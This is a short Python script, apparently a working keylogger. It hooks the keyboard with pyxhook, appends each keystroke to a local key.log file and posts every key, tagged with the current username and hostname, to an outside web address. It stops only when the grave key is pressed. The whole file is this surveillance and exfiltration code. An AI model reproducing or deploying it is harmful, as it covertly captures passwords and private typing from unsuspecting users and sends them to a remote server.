import pyxhook
import requests
import psutil
import getpass
import os
import socket

log_file='key.log'
url = 'https://apps.arachnis.org/pt-project/'

def send2server(ch):
	data = str(getpass.getuser()) + '@' + str(socket.gethostname()) + '(' + str(ch) + ')'
	payload = {'Name': data}
	r = requests.post(url, data=payload)

def OnKeyPress(event):
	send2server(event.Key)
	fob=open(log_file,'a')
	fob.write(event.Key)
	fob.write('\n')

	if event.Ascii==96: #96 is the ascii value of the grave key (`)
		fob.close()
		new_hook.cancel()
    
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
